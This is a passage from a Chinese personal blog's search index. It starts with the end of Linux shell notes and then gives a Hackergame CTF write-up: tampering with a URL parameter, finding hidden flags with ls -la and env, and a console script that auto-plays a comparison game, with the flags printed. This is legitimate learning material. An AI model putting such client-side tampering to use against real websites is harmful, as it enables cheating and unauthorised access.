h&#x3D;”hello”)回车后echo $h就可打印hello</strong></p><p><strong>注:可用{}包裹变量防止变量误用</strong></p><h1 id="11-Shell-programming-for-loop-没有撤销，注意"><a href="#11-Shell-programming-for-loop-没有撤销，注意" class="headerlink" title="11.Shell programming:for loop(没有撤销，注意)"></a><strong>11.Shell programming:for loop</strong><strong>(没有撤销，注意)</strong></h1><p><strong>格式:for 变量名 in 文件名(注:x*表示x开头的文件,x??表示x后有两个字符的文件)</strong></p><p><strong>for &gt; do</strong></p><p><strong>for&gt; echo $ff(注:${ff#x}表示除去打印中前面的x(掐头)若将#换为%即除去后面(去尾))</strong></p><p><strong>for&gt; done</strong></p><h1 id="12-mv-修改文件名字-格式mv-改前名-改后名"><a href="#12-mv-修改文件名字-格式mv-改前名-改后名" class="headerlink" title="12.mv:修改文件名字(格式mv 改前名 改后名)"></a><strong>12.mv:修改文件名字(格式mv 改前名 改后名)</strong></h1>]]></content>
      
      
      <categories>
          
          <category> 基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hackergame复现</title>
      <link href="/2024/12/02/Hackergame%E5%A4%8D%E7%8E%B0/"/>
      <url>/2024/12/02/Hackergame%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h1><p><img src="/../img/%E5%8D%9A%E5%AE%A2/Hackergame/image-20241202200135795.png"></p><p>错误输入一次后在url框中发现false，修改为true后获得flag</p><h1 id="喜欢做签到的-CTFer-你们好呀"><a href="#喜欢做签到的-CTFer-你们好呀" class="headerlink" title="喜欢做签到的 CTFer 你们好呀"></a>喜欢做签到的 CTFer 你们好呀</h1><p>题目要求ctf战队招新网站，在承办单位中找到，进去后为Linux终端</p><p><img src="/..%5Cimg%5C%E5%8D%9A%E5%AE%A2%5CHackergame%5Cimage-20241202201559275.png" alt="image-20241202201559275"></p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/Hackergame/image-20241202201816473.png" alt="image-20241202201816473"></p><h2 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h2><p>通过help命令找出可用命令，再用ls -la命令找到隐藏的.flag文件，cat .flag获得</p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/Hackergame/image-20241202212741079.png" alt="image-20241202212741079"></p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/Hackergame/image-20241202212824364.png" alt="image-20241202212824364"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;0k_175_a_h1dd3n_s3c3rt_f14g___please_join_us_ustc_nebula_anD_two_maJor_requirements_aRe_shown_somewhere_else&#125;</span><br></pre></td></tr></table></figure><h2 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h2><p>输出.oh-you-found-it的内容，提示考虑其他目录，进入Awards时提示要管理员权限，但是sudo su时<strong>跳转奶龙</strong></p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/Hackergame/image-20241202213626492.png" alt="image-20241202213626492"></p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/Hackergame/image-20241202213700627.png" alt="image-20241202213700627"></p><p>尝试其他命令在输入env(显示环境变量)时发现flag在环境变量中</p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/Hackergame/image-20241202213940613.png" alt="image-20241202213940613"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;actually_theres_another_flag_here_trY_to_f1nD_1t_y0urself___join_us_ustc_nebula&#125;</span><br></pre></td></tr></table></figure><h1 id="比大小王"><a href="#比大小王" class="headerlink" title="比大小王"></a>比大小王</h1><p>源码有些看不懂，看题解在控制台直接粘贴该代码获得flag</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">function f() &#123;</span><br><span class="line">  // 只要还没到 100 分</span><br><span class="line">  if (state.score1 &lt; 100) &#123;</span><br><span class="line">    // 选择正确的答案</span><br><span class="line">    if (state.value1 &lt; state.value2) &#123;</span><br><span class="line">      chooseAnswer(&#x27;&lt;&#x27;);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      chooseAnswer(&#x27;&gt;&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">    // 1 毫秒后再次调用 f 函数</span><br><span class="line">    setTimeout(f, 1);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">f();</span><br><span class="line"> </span><br><span class="line">function chooseAnswer(choice) &#123;</span><br><span class="line">  if (!state.allowInput) &#123;</span><br><span class="line">    return;</span><br><span class="line">  &#125;</span><br><span class="line">  state.inputs.push(choice);</span><br><span class="line">  let correct;</span><br><span class="line">  if (state.value1 &lt; state.value2 &amp;&amp; choice === &#x27;&lt;&#x27; || state.value1 &gt; state.value2 &amp;&amp; choice === &#x27;&gt;&#x27;) &#123;</span><br><span class="line">    correct = true;</span><br><span class="line">    state.score1++;</span><br><span class="line">    document.getElementById(&#x27;answer&#x27;).style.backgroundColor = &#x27;#5e5&#x27;;</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    correct = false;</span><br><span class="line">    document.getElementById(&#x27;answer&#x27;).style.backgroundColor = &#x27;#e55&#x27;;</span><br><span class="line">  &#125;</span><br><span class="line">  document.getElementById(&#x27;answer&#x27;).textContent = choice;</span><br><span class="line">  document.getElementById(&#x27;score1&#x27;).textContent = state.score1;</span><br><span class="line">  document.getElementById(&#x27;progress1&#x27;).style.width = `$&#123;state.score1&#125;%`;</span><br><span class="line">  state.allowInput = false;</span><br><span class="line">  setTimeout(() =&gt; &#123;</span><br><span class="line">    if (state.score1 === 100) &#123;</span><br><span class="line">      submit(state.inputs);</span><br><span class="line">    &#125; else if (correct) &#123;</span><br><span class="line">      state.value1 = state.values[state.score1][0];</span><br><span class="line">      state.value2 = state.values[state.score1][1];</span><br><span class="line">      state.allowInput = true;</span><br><span class="line">      document.getElementById(&#x27;value1&#x27;).textContent = state.value1;</span><br><span class="line">      document.getElementById(&#x27;value2&#x27;).textContent = state.value2;</span><br><span class="line">      document.getElementById(&#x27;answer&#x27;).textContent = &#x27;?&#x27;;</span><br><span class="line">      document.getElementById(&#x27;answer&#x27;).style.backgroundColor = &#x27;#fff&#x27;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      state.allowInput = false;</span><br><span class="line">      state.stopUpdate = true;</span><br><span class="line">      document.getElementById(&#x27;dialog&#x27;).textContent = &#x27;你选错了，挑战失败！&#x27;;</span><br><span class="line">      document.getElementById(&#x27;dialog&#x27;).style.display = &#x27;flex&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;, 1);  // 这里的 200 改成了 1</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;I-am-tHE-hAckEr-king-0F-C0mPar!Ng-NUM6ErS-z024&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 赛题复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 比赛 </tag>
            
            <tag> 复现 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
